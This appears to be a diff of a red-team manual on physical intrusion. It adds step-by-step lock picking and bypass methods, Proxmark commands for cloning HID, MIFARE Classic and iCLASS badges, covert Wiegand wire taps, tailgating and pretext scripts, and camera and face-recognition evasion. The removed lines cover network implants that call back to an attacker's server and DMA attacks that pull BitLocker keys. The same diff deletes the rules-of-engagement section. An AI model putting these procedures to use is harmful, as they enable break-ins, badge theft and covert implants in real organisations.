+    - Hook 1 (standard hook pick): workhorse, 80% of pins
+    - Offset Diamond: for tight keyways
+    - City Rake (snake rake): fast raking on cheap locks  
+    - Short Hook: deep chambers, narrow keyways
+    - Tension bars: top-of-keyway (TOK) and bottom-of-keyway (BOK)
+      → TOK tension: less binding, more feedback (learn on this)
+      → BOK tension: more control, cleaner SPP
+
+  Practice locks (buy separately):
+    1. Master Lock No.3 ($8): start here, 4-pin standard
+    2. Brinks 40mm ($10): slightly tighter tolerances
+    3. Master Lock 140 ($12): 5-pin, brass, better feedback
+    4. ABUS 55/40 ($15): euro-quality, teaches real feedback
+    5. Mul-T-Lock Junior ($25): intro to security pins
+
+MID-LEVEL KIT ($80-150):
+  Multipick Kronos (multipick.com): German machined, professional
+  Peterson Gem hook: best feedback tool made
+  SouthOrd PXS-14 set: full range
+  Dimple lock picks: for Schlage C-series, Yale variants
+```
+
+#### Single Pin Picking (SPP) - Step by Step
+
+```
+SETUP:
+1. Insert BOK or TOK tension bar into bottom/top of keyway
+2. Apply LIGHT rotational tension: think the weight of one finger
+   Too much tension = pins bind too hard, won't set
+   Too little tension = set pins drop back
+   
+3. Insert hook pick ABOVE the tension bar
+
+THE METHOD:
+Step 1: Find the binding pin
+  Apply light tension → probe each pin from back to front
+  Binding pin = the one that feels stiff/doesn't spring back freely
+  (Manufacturing tolerances make one pin bind first under tension)
+
+Step 2: Set the binding pin
+  Lift binding pin until you feel/hear a slight CLICK
+  or a subtle rotation in the plug (fraction of a degree)
+  That pin is now SET on the shear line
+  → DO NOT release tension or it drops
+
+Step 3: Find the next binding pin
+  Now a different pin is binding (next tightest tolerance)
+  Repeat: lift until set
+
+Step 4: Continue until all pins set
+  Plug rotates → lock opens
+
+FEEDBACK SIGNALS:
+  Set pin: slight click + plug rotation + pin feels "springy" at top
+  Overset pin: pin pushed too high → blocks rotation → back off slightly
+  False set: plug rotated further than expected but not fully → security pin
+
+SECURITY PINS (serrated / spool):
+  Feel like: pin sets, then resists further rotation (false set)
+  Fix: back off tension SLIGHTLY → pin drops to true set → continue
+  Spools are the most common: give a false set at the spool waist
+  Serrated: multiple false sets per pin
+```
+
+#### Raking - Fast Entry on Low-Security Locks
+
+```
+WHEN TO RAKE:
+  Time pressure + low-security target (filing cabinets, interior offices)
+  Raking is LOUD and fast, not covert but very quick (<30 seconds on cheap locks)
+
+TECHNIQUE:
+  Insert rake pick to the back of the keyway
+  Apply light tension (same as SPP)
+  Scrub rake in and out while varying tension
+  Pins randomly align → lock opens
+  
+  City Rake (snake): most versatile, works on Master-style locks
+  Bogota Rake: aggressive, faster but more noise
+  Worm Rake: gentle, good for wafer locks
+
+PRACTICE BENCHMARK:
+  Week 1: Open Master No.3 via raking in under 2 minutes
+  Week 2: Open Master No.3 via SPP in under 5 minutes
+  Week 4: Open 5-pin standard lock via SPP in under 3 minutes
+  Month 3: Open lock with security pins (spools) in under 5 minutes
+  Month 6: Open ABUS 55/40 consistently in under 4 minutes
+```
+
+#### Bypass Tools - Faster Than Picking
+
+```
+Not all locks need to be picked. Most can be bypassed faster.
+
+SHIMS (padlocks):
+  Thin aluminum shim → insert between shackle and body
+  Defeats spring-loaded shackle mechanisms (most padlocks under $40)
+  Cut shim from soda can: 2cm x 4cm, fold into J-shape
+  
+  Works on: Master No.1, No.3, most hardware-store padlocks
+  Does NOT work on: double-locking padlocks (Mul-T-Lock, ABUS Granit)
+
+LOIDING / CARDING (spring-bolt latches):
+  Credit card or mylar strip → insert between door and frame
+  Push card toward bolt while pressing door → latch retracts
+  Works on: interior office doors, hotel bathroom doors, storage rooms
+  Does NOT work on: deadbolts, rim latches with anti-loid plates
+
+UNDER-DOOR TOOLS:
+  For doors that open toward you with lever handles
+  Tool: Under-Door Tool (UDT) + Long-reach hook
+  Slide UDT under door → loop over lever handle → pull
+  Opens lever-handle doors without touching the lock
+  Source: UDT from covertinstruments.com (~$40)
+  Works on: most interior lever-handle doors
+  Time: 10–30 seconds
+
+BUMP KEY:
+  Key cut to maximum depth on all positions
+  Insert, apply rotational tension, strike with mallet → pins jump
+  momentarily above shear line → plug turns
+  
+  Source: buy bump key set matching target key profile (Kwikset, Schlage)
+  Requires: matching key blank profile + rubber mallet or bump hammer
+  Noise: moderate knock sound, not for covert silent entry
+
+BYPASS SPATULA (padlocks with locking disc):
+  Thin flexible steel spatula through shackle hole
+  Manipulates internal pawl → shackle releases
+  Works on: laminated padlocks (Master No.3, No.140)
+  Source: Sparrows bypass tools
+```
+
+#### Lock Selection in the Field
+
+```
+ASSESS BEFORE PICKING:
+  1. Brand + model → estimated security level
+  2. Keyway profile → which pick fits
+  3. Number of pins → complexity estimate
+  4. Condition → worn lock = easier (worn pins set easier)
+  5. Time available → pick vs rake vs bypass decision
+
+COMMON FIELD TARGETS:
+  Interior office door deadbolt (Schlage B60N): SPP, 5-pin
+  Padlock on server room (Master No.3): shim or rake, 30s
+  Filing cabinet (wafer lock): common wafer rake, 10s
+  Exterior deadbolt (Medeco/Mul-T-Lock): avoid, use bypass instead
+  Badge reader door with no mechanical backup: bypass under door
+```
+
+---
+
+### 1.2 RFID & NFC BADGE CLONING
+
+#### How Access Control Works (Understand Before Attacking)
+
+```
+SYSTEM LAYERS:
+  1. Card (credential carrier)
+  2. Reader (reads card, sends data over Wiegand wire)
+  3. Controller (receives Wiegand data, makes access decision)
+  4. Lock/door hardware (controlled by access decision)
+
+FREQUENCIES:
+  125kHz (LF, proximity): HID Prox, EM4100, Indala, AWID
+    → No encryption, read-only, trivially cloneable
+    → Still the most common in commercial buildings globally
+    
+  13.56MHz (HF, smart cards): MIFARE Classic, DESFire, iCLASS, NFC
+    → MIFARE Classic: encryption broken (Crypto1, 2008)
+    → MIFARE DESFire EV2/EV3: AES-128, currently secure
+    → iCLASS Legacy: master key stolen/published 2010, broken
+    → iCLASS Seos: AES, currently secure
+```
+
+#### Equipment
+
+```
+FLIPPER ZERO ($170: start here):
+  Site: flipperzero.one
+  Reads: 125kHz (HID, EM4100), 13.56MHz NFC, SubGHz (315/433/868/915MHz)
+  Also: Bad USB (HID keyboard emulation), IR blaster, GPIO
+  Limitation: cannot crack MIFARE Classic keys (need Proxmark for that)
+  Use for: reading cards, emulating reads, SubGHz remotes (garage doors)
+
+PROXMARK3 RDV4 ($350: professional standard):
+  Site: proxmark.com (get from RRG / Dangerous Things / Lab401)
+  Full attack suite for all major RFID protocols
+  Scripts: hf mf autopwn, lf hid read, hf iclass loclass
+  Required for: MIFARE Classic crack, iCLASS key recovery, advanced attacks
+  
+  Firmware update first (always):
+    git clone https://github.com/RfidResearchGroup/proxmark3
+    cd proxmark3 && make clean && make all
+    ./pm3-flash-all
+
+LONG-RANGE READER (covert harvesting):
+  BishopFox Tastic RFID Thief: reads at 1-3 foot range
+    Fits inside standard reader housing → deployed at target
+    Logs card data → retrieve later
+  
+  ESP-RFID-Tool: cheaper alternative (~$30 in parts)
+    ESP8266 + RFID reader module → stores reads to SD card
+    Site: github.com/rfidresearchgroup/esp-rfid-tool
+    Fits inside junction box or reader housing
+
+BLANK WRITABLE CARDS:
+  T5577 (125kHz blank): reads and writes HID, EM4100 (~$1/card)
+  MIFARE Classic 1K blank: ~$0.50/card (for cloned MFC cards)
+  Source: aliexpress.com (search: T5577 card, MIFARE Classic blank)
+```
+
+#### Step-by-Step: Clone a 125kHz HID Card
 
 ```bash
-# Proximity cards (125kHz): HID, EM4100
-# Smart cards (13.56MHz): MIFARE Classic, DESFire, iCLASS
+# STEP 1: Read target card with Proxmark
+proxmark3 -p /dev/ttyACM0  # connect
+[PM3] > lf hid read         # hold reader near HID card
+# Output:
+# HID Prox TAG ID: 2006ec23b1 (40 bits)
+# Format: Corporate 1000 (35 bit) FC: 118 CN: 3491
 
-# Equipment:
-# Flipper Zero: https://flipperzero.one ($170)
-#   → Read/clone 125kHz, 13.56MHz NFC, SubGHz (garage doors, remotes)
-#   → Bad USB, IR blaster, GPIO
-# Proxmark3 (RDV4): https://proxmark.com ($350)
-#   → Professional RFID tool, supports all major protocols
-#   → Attack MIFARE Classic (crypto1 weakness)
+# STEP 2: Clone to T5577 blank card
+[PM3] > lf hid clone --r 2006ec23b1  # write to T5577 held near antenna
+# Verification:
+[PM3] > lf hid read         # read T5577 → should match original
 
-# Flipper Zero: read a card
-# Sub-GHz → RFID → Read
-# Hold to badge → captured in seconds
-# Save as file → clone to writable card → Write
+# STEP 3 (Flipper Zero alternative):
+# RFID → Read → Hold Flipper to card → Saved
+# RFID → Saved → Select → Write → Hold Flipper to T5577 blank
+# Done in under 30 seconds total
 
-# Proxmark3: HID card clone
-proxmark3> lf hid read    # Read HID card
-proxmark3> lf hid clone --r [CARD_DATA]  # Write to T5577 blank card
-
-# MIFARE Classic attack (crypto1 is broken):
-proxmark3> hf mf autopwn  # Auto-crack keys, dump card
-# Save dump → clone to blank MIFARE card
-proxmark3> hf mf restore  # Write dump to blank card
-
-# Long-range read (covert cloning):
-# ESPKey: covert RFID implant, reads when badge touches reader
-# ChameleonMini: multi-protocol, can emulate any card
-# BishopFox Tastic RFID Thief: reads at distance (in reader housing)
-# Deploy at target's reader → harvest employee badges passively
-
-# iCLASS attack:
-# Legacy iCLASS uses static key (master key stolen 2010, public)
-proxmark3> hf iclass loclass  # Recover keys
-proxmark3> hf iclass dump --ki 1  # Dump with key
+# COVERT READ: reading card through a wallet/pocket:
+# HID ProxCard II: readable at 3-6 inches with Proxmark LF antenna
+# Technique: "brush past" target with reader concealed in portfolio/clipboard
+# ESPKey deployed at target reader: reads every card that badges in
 ```
 
----
-
-#### **2. Tailgating & Social Entry**
-
-```
-Methodology (documented physical pen tests):
-
-Pre-entry OSINT:
-- Google Street View: entrance layout, security post position, badge reader type
-- LinkedIn: employee attire, badge lanyards color, visitor badge appearance
-- Job postings: security vendors, access control systems used
-- Dumpster diving (if accessible): shredded badges, org charts, employee directories
-
-Entry techniques:
-1. Tailgating: follow closely behind badge-in employee
-   "Oh, thanks! My hands are full." [holding coffee + laptop bag]
-   Success rate: ~80% without challenge in studies
-
-2. Pretext: IT vendor, facilities, fire inspector, elevator maintenance
-   "Hi, I'm from [elevator company] for the quarterly maintenance."
-   Wear a uniform → rarely challenged
-   Have a clipboard → never challenged (psychological effect)
-
-3. Piggyback: wait at badge-in door, let someone in, you follow
-   Hold door for them → social obligation reverses
-
-4. Distraction: create minor incident at reception
-   accomplice asks for directions / has delivery
-   while you badge through secondary entrance
-
-On-site behavior:
-- Walk with purpose: hesitation triggers challenge
-- Look like you belong: business casual, badge visible (fake)
-- Phone to ear: reduces eye contact, signals "busy professional"
-- Printer tactic: carry paper to/from printer → seen as employee task
-- Find an empty meeting room → plug in LAN implant → leave
-
-Hardware drops:
-- LAN Turtle: plugs between ethernet and device → VPN callback
-  https://hak5.org/products/lan-turtle
-- Shark Jack: active network implant
-- Rubber Ducky: plug into unattended unlocked machine → keystrokes
-- Bash Bunny: multi-vector, RNDIS/HID/storage combo
-```
-
----
-
-#### **3. Hardware Implants**
+#### Step-by-Step: MIFARE Classic Attack
 
 ```bash
-# LAN Turtle: persistent VPN callback
-# Plugs between target ethernet port and their device
-# Establishes SSH tunnel to your VPS → you pivot through
+# MIFARE Classic uses Crypto1 encryption: broken since 2008
+# Default keys exist for many cards (never changed after deployment)
 
-# Setup:
-# 1. SSH to turtle over USB during setup
-ssh root@172.16.84.1  # Default LAN Turtle IP
-# 2. Configure autossh module: connect to your VPS permanently
-# Modules: Cron, Autossh, Metasploit, Nmap, tcpdump
+# STEP 1: Detect card type
+[PM3] > hf search
+# Output: ISO/IEC 14443-A (MIFARE Classic 1K) - UID: A3 4F 2B 11
 
-# O.MG Cable: looks exactly like Apple Lightning/USB-C cable
-# Contains WiFi-enabled microcontroller
-# Connect to victim's Mac → appears as keyboard
-# Sends keystrokes remotely via mobile hotspot
-# https://o.mg.lol/
+# STEP 2: Auto-crack all sectors (tries known keys first)
+[PM3] > hf mf autopwn
+# Runtime: 30 seconds to 5 minutes depending on key diversity
+# Output: Keys file saved as dumpfilename.json
+# Dumps all 16 sectors to dumpfilename.bin
 
-# PCILeech implant: DMA over PCIe/Thunderbolt
-# Screamer M.2: M.2 slot → DMA access to host RAM
-# For laptop targets with M.2 slot accessible
-# Attack from another machine: read/write RAM, bypass login screen
-# Even BitLocker: keys in RAM → DMA → extract → unlock drive
+# STEP 3: Clone to blank MIFARE Classic card
+[PM3] > hf mf restore --1k --uid A3 4F 2B 11  # write dump back to blank card
+# Result: perfect clone of original card
 
-# KeySweeper: hidden USB charger + keylogger
-# LOOKS like a Microsoft USB charger
-# Sniffs 2.4GHz Microsoft wireless keyboards (unencrypted)
-# Texts collected keystrokes to attacker's phone
-# Plant in office, retrieve data remotely
-
-# Wi-Fi Pineapple Mark VII
-# Rogue AP + man-in-the-middle platform
-# Place near target office → harvest WiFi credentials, probe requests
-# https://www.hak5.org/products/wifi-pineapple
-
-# Packet Squirrel: ethernet MITM
-# Inline between switch and device
-# Captures packets, runs tcpdump, provides VPN callback
-# Transparent to both sides
+# IF DEFAULT KEYS FAIL: nested attack:
+[PM3] > hf mf nested --1k --blk 0 --key a --keys hf-mf-default-keys.dic
+# Exploits authentication nonce leakage to recover unknown keys
+# Runtime: 1-5 minutes
 ```
 
----
-
-## 2027 FORWARD: QUANTUM COMPUTING IMPACT
-
-### Current State (2025–2027)
-
-```
-Timeline reality:
-- Cryptographically Relevant Quantum Computer (CRQC): 2030–2035 est.
-- "Store Now, Decrypt Later" (SNDL): already happening
-- NIST PQC standards: finalized 2024 (ML-KEM, ML-DSA, SLH-DSA)
-- Migration window: 2025–2030 is critical
-
-What quantum breaks:
-- RSA (all key sizes): Shor's algorithm, O(n³) on quantum
-- ECC (elliptic curve): Shor's algorithm breaks discrete log
-- DH/ECDH: key exchange broken
-- TLS 1.2/1.3 (RSA/ECDSA): broken
-- PGP / GPG: broken
-- SSH (RSA/ECDSA keys): broken
-- JWT (RS256, ES256): broken
-- Bitcoin/Ethereum ECDSA signatures: broken
-
-What quantum does NOT break:
-- AES-256: Grover's halves search space → still 128-bit effective, increase to AES-256
-- SHA-256/SHA-3: weakened by Grover's but not broken at 256-bit
-- Symmetric encryption generally: survives with doubled key length
-```
-
-### Attack Opportunities in the Migration Period
+#### Step-by-Step: iCLASS Legacy Attack
 
 ```bash
-# "Store Now, Decrypt Later": harvest encrypted traffic NOW
-# When CRQC exists → decrypt everything captured today
-# Nation-state adversaries are doing this already
+# iCLASS Legacy uses a "master key" that was reverse engineered and
+# published publicly. Every iCLASS Legacy card can be read with it.
 
-# Target for SNDL collection:
-# - TLS traffic to high-value targets (government, military, finance)
-# - Encrypted emails between executives
-# - VPN traffic from sensitive organizations
-# - Any long-lived secret encrypted with RSA/ECC today
+# STEP 1: Detect
+[PM3] > hf iclass info
+# Confirm: iCLASS Legacy (not SE, not Seos)
 
-# PCAP collection infrastructure:
-# Set up: network tap or span port → PCAP storage
-# Tag with: source, destination, date
-# Store for: 5-10 years → decrypt when CRQC available
+# STEP 2: Recover application keys using master key
+[PM3] > hf iclass loclass --bruteforce
+# Uses published master key material to derive per-card app keys
 
-# Migration attack surface (2025-2027):
-# Organizations migrating from classical to PQC
-# Implementation bugs in PQC libraries (new code = new bugs)
-# Hybrid modes (classical + PQC): downgrade attacks
+# STEP 3: Dump card contents
+[PM3] > hf iclass dump --ki 1  # key index 1 = recovered key
+# Full card memory dumped
 
-# Key confusion during migration:
-# Server offers both RSA and ML-KEM
-# If client can be forced to use RSA path → classical attack applies
-# Downgrade attack: intercept handshake, remove ML-KEM from ClientHello
-
-# PQC implementation attacks (new research area):
-# ML-KEM (CRYSTALS-Kyber): side-channel attacks on decapsulation
-# ML-DSA (CRYSTALS-Dilithium): fault injection attacks
-# SLH-DSA (SPHINCS+): timing side-channels on hash evaluation
-
-# Tools for PQC research:
-# liboqs: https://github.com/open-quantum-safe/liboqs (reference impl)
-# PQCrypto-SIDH: (SIDH was broken 2022, don't use, but study the break)
-# NIST PQC documentation: https://csrc.nist.gov/Projects/post-quantum-cryptography
-
-# Cryptographic inventory (pre-assessment step for 2027):
-# Identify all RSA/ECC usage in target: certs, SSH keys, JWT, TLS config
-# These are all vulnerable to CRQC: document for future attack or defense
-openssl s_client -connect target.com:443 | grep "Server public key"
-# Size 2048/4096 bit RSA → quantum-vulnerable
-# ECDSA P-256/P-384 → quantum-vulnerable
-# X25519 (KEM only, not signature) → quantum-vulnerable
-
-# SSH key audit:
-find /etc /home -name "authorized_keys" 2>/dev/null -exec grep -l "ssh-rsa\|ecdsa" {} \;
-# All ssh-rsa and ecdsa-sha2 keys → vulnerable
-# ed25519 → still quantum-vulnerable (but smaller attack surface)
+# STEP 4: Clone
+[PM3] > hf iclass restore --ki 1  # restore dump to blank iCLASS card
 ```
 
 ---
 
-## RED TEAM OPS: SCOPING, ROE & REPORTING
+### 1.3 WIEGAND WIRE-LAYER ATTACK
 
-### Why This Section Exists
+#### Why This Matters (Most People Miss This)
 
-Skills without operational discipline produce disasters. Real red teams operate under Rules of Engagement. Understanding ROE makes you better at bypassing controls (you know what's in scope) and more valuable to clients (you produce actionable output).
+```
+Every card reader connects to an access controller via Wiegand protocol.
+Wiegand is the DATA WIRE: unencrypted, no authentication, no integrity check.
+The attack surface is the WIRE, not the card.
+
+Even if the card uses AES (DESFire EV3, iCLASS Seos):
+the reader decrypts it and sends PLAINTEXT down the Wiegand wire.
+The wire never got the security memo.
+
+Physical access to any reader's wiring = full credential interception.
+Reader wiring is typically exposed in:
+  - Junction boxes near readers
+  - Above drop ceilings at reader mounting points
+  - Server closets where controllers are installed
+```
+
+#### ESP-RFID-Tool - Wiegand Interception
+
+```
+HARDWARE NEEDED:
+  ESP8266 NodeMCU ($3) or Wemos D1 Mini ($4)
+  MicroSD module ($1)
+  MicroSD card (any size)
+  Wires, small enclosure
+
+FIRMWARE:
+  git clone https://github.com/rfidresearchgroup/esp-rfid-tool
+  Flash using Arduino IDE or esptool:
+  esptool.py --port /dev/ttyUSB0 write_flash 0x0 esp-rfid-tool.bin
+
+WIEGAND WIRING:
+  Standard Wiegand cable has:
+    RED:   +12V power (do NOT connect to ESP)
+    BLACK: Ground (GND → connect to ESP GND)
+    GREEN: Data0 (Wiegand D0 → connect to ESP GPIO4)
+    WHITE: Data1 (Wiegand D1 → connect to ESP GPIO5)
+
+INTERCEPTION DIAGRAM:
+  Controller ←-[existing cable]-→ [TAP POINT] ←-[original cable]→ Reader
+                                        ↓
+                                    ESP-RFID-Tool
+                                    (logs all Wiegand data to SD card)
+
+CONNECTION:
+  The ESP sits passively on the D0/D1 lines, just listening
+  No disruption to normal operation
+  Every badge swipe → full card data logged with timestamp
+  
+DEPLOYMENT:
+  Fit device in junction box at reader (access above drop ceiling)
+  Device runs off 3.3V regulated from any USB power bank
+  Or tap the reader's 5V auxiliary line
+  Wait 24-48 hours → retrieve → SD card has all employee card data
+
+DATA FORMAT LOGGED:
+  2027-01-15 08:42:11, CardID: 2006EC23B1, Bits: 35, FC: 118, CN: 3491
+  → Import directly to lf hid clone for playback
+```
 
 ---
 
-### Rules of Engagement Essentials
+### 1.4 TAILGATING & SOCIAL ENTRY
+
+#### Pre-Operation OSINT (Do This Before Leaving Your Desk)
 
 ```
-Critical pre-engagement documents:
+TARGET RESEARCH (minimum 48 hours before physical op):
 
-1. Statement of Work (SOW):
-   - Scope: IP ranges, domains, physical locations, personnel
-   - Out-of-scope: production databases, specific servers, C-suite personal devices
-   - Start/end dates and times
-   - Emergency stop procedures
+1. GOOGLE MAPS / STREET VIEW:
+   - Entrance layout, security booth position, camera placement
+   - Badge reader height and type (HID vs MIFARE vs keypad)
+   - Visitor parking distance to entrance
+   - Side entrances, loading docks, smoking areas (soft entry points)
 
-2. Authorization letter:
-   - Signed by: C-level executive with authority
-   - Includes: tester names, company name, date range
-   - Carry physical copy during physical assessments
-   - THIS IS WHAT KEEPS YOU OUT OF HANDCUFFS
+2. LINKEDIN RECONNAISSANCE:
+   - Employee attire standards (formal? business casual? casual?)
+   - Badge lanyard color and position (chest level? belt clip?)
+   - Visitor badge appearance (often photographed at company events)
+   - Job postings → reveals security vendors ("experience with Lenel S2")
+     This tells you the access control system brand before arriving
 
-3. Emergency contacts:
-   - Security team lead (if testing detected → they can call off SOC)
-   - Legal team contact
-   - Your organization's legal contact
+3. GOOGLE/BING IMAGE SEARCH:
+   [Company name] "office" site:linkedin.com OR site:glassdoor.com
+   → Employee-posted office photos → badge designs, desk layouts
 
-Key ROE decisions to document:
-- Social engineering: allowed? Which personnel? What methods?
-- Phishing: allowed? What pretexts? Credential harvesting only or payload delivery?
-- Physical: which buildings? Which floors? 
-- Destructive testing: allowed? (DoS, data modification)
-- Exfiltration simulation: how? (HTTP, DNS, cloud? Actual data or sample?)
-- Escalation path: what to do if you find real criminal activity?
-  (e.g., insider threat evidence, actual malware not planted by your team)
+4. COMPANY WEBSITE / PRESS RELEASES:
+   "We're proud to welcome visitors to our new HQ" → interior photos
+   Executive photos in office → badge visible, desk layout visible
+
+5. DUMPSTER INTELLIGENCE:
+   Access the accessible dumpster 1-2 days before
+   Shredded documents (sometimes partially shredded)
+   Old badges (even expired → shows badge design, vendor)
+   Org charts, phone directories, vendor invoices
+   → Use shredded badge to copy visual design
+
+PARKING STRUCTURE INTELLIGENCE:
+  Most parking structures have the same access control as the building
+  Test parking → observe badge reader type before main engagement
+  Employees badge into parking first → confirm HID vs MIFARE
+```
+
+#### Entry Techniques - Detailed
+
+```
+TECHNIQUE 1: TAILGATE (most common, highest success rate)
+
+Setup:
+  Time your arrival during PEAK FLOW (8:45-9:15am, 12:45-1:15pm)
+  Dress to match observed employee attire exactly
+  Carry: coffee cup + laptop bag (hands full = social proof)
+  Have a fake badge on lanyard (same color/position as observed)
+
+Execution:
+  Stand near badge reader, phone to ear (active call reduces interaction)
+  Wait for group of 2+ employees approaching
+  Time your walk to arrive at door 2 seconds behind them
+  As door opens, step in behind the last person
+  Say nothing unless directly challenged
+  If challenged: "Oh thanks! My hands are completely full." [gesture to coffee]
+
+Psychology:
+  Holding the door for someone requires THEM to acknowledge you
+  The brief eye contact + nod exchange is the social transaction
+  Most employees assume you belong; the burden of proof is on them
+  Success rate: ~78% without any verbal interaction (Hadnagy, 2011)
+
+TECHNIQUE 2: VENDOR PRETEXT
+
+Uniform options:
+  IT vendor: polo shirt with logo, rolling tool bag
+  Elevator maintenance: coveralls, clipboard, hardhat
+  Fire extinguisher inspection: uniform shirt, clipboard, hand cart
+  Coffee machine service: polo, brand-labeled bag of supplies
+
+Best pretexts by environment:
+  Financial firm → IT vendor ("exchange server upgrade")
+  Hospital → medical device calibration ("annual biomedical check")
+  Retail HQ → HVAC maintenance
+  Government facility → fire suppression inspection (nearly never challenged)
+
+Psychological anchors:
+  Clipboard: authority + legitimacy signal, hands appear occupied
+  Uniform: removes ambiguity about role, shifts challenge threshold
+  Paper work order: "I have a work order for the third floor server room"
+     → never show it, just reference it (most won't ask to see it)
+  Urgency: "They said it was down before 10 or they'd miss the audit"
+
+Script skeleton (elevator maintenance pretext):
+  [AT RECEPTION]
+  "Hi, I'm here from [COMPANY] for the quarterly maintenance on the 
+  elevators. We got a call this morning about a door sensor on 4. 
+  I'm on for Jenkins on the ticket."  
+  → Name drop a generic first name (Jenkins, Patterson, Reynolds)
+  → Reference a ticket → implies an existing relationship
+  → Don't wait for a full answer: set bag down, look at clipboard,
+     create implied momentum → they badge you in to clear the queue
+
+TECHNIQUE 3: REVERSE SOCIAL ENGINEERING
+
+Setup:
+  Contact target in advance (email or phone) as vendor
+  "I'll be sending a technician Thursday at 10am for the [service]"
+  
+  Day of: arrive as "the technician they were told about"
+  Reception has already been told someone is coming
+  → Challenged? "James set this up last week; he said to check in at reception"
+  → They feel embarrassed not to know → badge you in to avoid awkwardness
+
+TECHNIQUE 4: SMOKER'S ENTRANCE
+
+Many secured buildings have a "back of building" smoking area:
+  Accessed through a door that is:
+  - Often propped open by smokers (fire door held with brick/wedge)
+  - Or has lower vigilance because it's "internal" space
+  
+  Park in back lot → walk to smoking area → enter with smokers
+  No badges required when door is propped open
+
+TECHNIQUE 5: DELIVERIES / LOADING DOCK
+
+Loading docks often operated by:
+  - Contract staff (less invested in security policy)
+  - Rotating staff (don't know regular vendor faces)
+  
+  Approach with: hand truck / dolly + cardboard boxes (even empty)
+  "Delivery for [FLOOR/DEPARTMENT]" → often waved through without badge
+  Loading dock bypasses primary access control entirely
+  Box labels: print realistic shipping labels (vendor name, tracking number)
+```
+
+#### On-Site Behavior - Staying Operational
+
+```
+THE FIRST 90 SECONDS ARE CRITICAL:
+  Enter and walk WITH PURPOSE: hesitation is the only trigger
+  Turn left or right immediately (not straight to reception → you look lost)
+  Act as if you've been here before
+
+MOVEMENT RULES:
+  Phone to ear: reduces unsolicited conversation by ~60%
+  Walk like you know the destination (even if you don't)
+  Make eye contact + nod at passing employees (too little = suspicious)
+  Carry something: coffee, laptop bag, toolbox, clipboard
+
+FINDING TARGETS:
+  Printers: employees visit from all floors → carry paper to/from printer
+    "Just grabbing a printout" → legitimate reason to be anywhere
+  
+  Kitchen/break rooms: public feeling, no badge required, employees relax
+    → Leave hardware implants on extension strips, behind microwaves
+  
+  Conference rooms: book via Google Maps (many show conference room
+    schedules if not properly secured) → "I'm here for the 10am"
+  
+  Bathroom: no cameras (legal in most jurisdictions) → safe regrouping
+    → Good place to change appearance element (add/remove jacket, hat)
+
+ABORT SIGNALS: leave immediately if:
+  Two employees approach you simultaneously
+  Anyone says "Can I see your badge?" directly
+  Security desk calls your way specifically
+  Someone you used as social anchor starts asking colleagues about you
+
+CLEAN ABORT PROTOCOL:
+  Do not run. Do not change expression.
+  "I think I have the wrong building. Do you know where [competitor name] is?"
+  Turn, walk to exit, leave.
+  This is not failure. This is operations. Abort = survive to re-engage.
 ```
 
 ---
 
-### Red Team Report Structure
+### 1.5 COUNTER-SURVEILLANCE & IN-BUILDING OPSEC
+
+#### Camera System Assessment
+
+```
+TYPES OF CAMERAS:
+  Fixed dome: covers fixed angle, predictable blind spot at edges
+  PTZ (pan-tilt-zoom): operator-controlled, can follow you; assume active
+  Fisheye: wide area coverage, lower resolution at edges
+  Bullet: long-range, directional; treat as targeted coverage
+
+BEFORE THE OP: camera mapping:
+  Google Street View: exterior camera positions
+  LinkedIn office photos: interior camera heights and positions
+  Note: most cameras are installed at standard heights (8-10 feet)
+         → Coverage starts 3-4 feet from base → stay close to walls below cameras
+
+IN-BUILDING BLIND SPOTS:
+  Below and directly beside dome cameras (within 18 inches of mount)
+  Stairwells: cameras often cover landing → stairs themselves are blind
+  Elevator interiors: camera in corner → far corner has partial coverage
+  Between rows of server racks: cameras cover aisle ends, not mid-row
+  Loading dock blind spots: between parked delivery vehicles
+
+APPEARANCE MODIFICATION (between camera checkpoints):
+  Jacket on/off changes silhouette
+  Hat changes head profile
+  Carrying item in opposite hand changes gait signature
+  → Modern video analytics can track gait → do all three together
+  → This defeats basic gait-based identification in most commercial systems
+
+FACE RECOGNITION COUNTERMEASURES (2027 context):
+  Commercial FR systems: accuracy drops significantly with:
+    - Overhead lighting at 45+ degree angle (shadows on face)
+    - Wearing a high-collared jacket (reduces chin/jaw profile)
+    - Looking slightly down (floor angle → top of head visible, not face)
+    - No makeup vs heavy makeup: some evasion possible
+    - IR-blocking glasses (Evolv, Briefcam use IR): not reliable in 2027
+  
+  Most practical: move through camera zones quickly, head angled down 15°,
+  hat with brim, minimal face exposure time. This is enough for most
+  commercial deployments.
+
+WIRELESS SCANNING: what is in this building:
+  Before / during op, scan with phone running NetSpot or WiFi Analyzer
+  Document: SSIDs, BSSIDs, channels, signal strength
+  Identify: guest network, corporate SSID, IoT segment, hidden SSIDs
+  → Context for Phase 4F attacks
+  → Helps locate network closets (highest signal = physical proximity)
+```
+
+#### Hardware Implant Placement Assessment
+
+```
+PLACEMENT CRITERIA (in order of priority):
+  1. Physical concealment: behind equipment, inside junction box, cable tray
+  2. Power availability: need USB, wall outlet, or PoE
+  3. Network connectivity: ethernet preferred, WiFi as backup
+  4. Low-traffic area: server room > storage closet > kitchen > common area
+  5. Maintenance access: you need to retrieve it (or not, if burnable)
+
+BEST LOCATIONS BY TYPE:
+  LAN Turtle (ethernet implant):
+    - Between switch and wall plate in server room
+    - Under raised floor near network patch panel
+    - Inside IDF/MDF closet behind existing equipment
+    
+  Wi-Fi Pineapple:
+    - Network closet or storage room with 12V power
+    - Or: in the drop ceiling above common areas (tape to beam)
+    
+  O.MG Cable:
+    - Charging station in conference room → first person to plug in
+    - Desktop keyboard replacement on unattended machine
+    - Left at reception desk as "forgotten" cable
+    
+  Rubber Ducky / Bash Bunny:
+    - Unattended unlocked workstations (screen unlocked = active session)
+    - Takes 30-60 seconds to execute payload
+    - Leave immediately after insertion + removal
+
+RETRIEVAL PLANNING:
+  Always plan retrieval before deployment
+  If retrieval not possible (burnt op): destroy remotely via C2
+  Document: exact location, power source, MAC address, deployment time
+```
+
+---
+
+### 1.6 DRONE-BASED SURVEILLANCE (2026–2027)
+
+```
+USE CASES FOR PHYSICAL RED TEAMS:
+  - Pre-engagement rooftop survey (HVAC entry points, rooftop access hatches)
+  - Camera position mapping from elevation
+  - Badge reader type identification from 30-50 feet (high-zoom camera)
+  - Security patrol timing observation
+  - Perimeter fence assessment
+  - Parking lot exit/entry timing
+
+RECOMMENDED PLATFORM:
+  DJI Mini 4 Pro (~$760)
+    Weight: 249g (under FAA/EASA registration threshold in most jurisdictions)
+    Max altitude: 120m (legal ceiling in most jurisdictions)
+    Camera: 4K/60fps, 48MP photo, 2x optical zoom + 4x digital
+    Obstacle avoidance: omnidirectional, stable near structures
+    Flight time: 34 minutes
+    
+  DJI Air 3 (~$1,099)
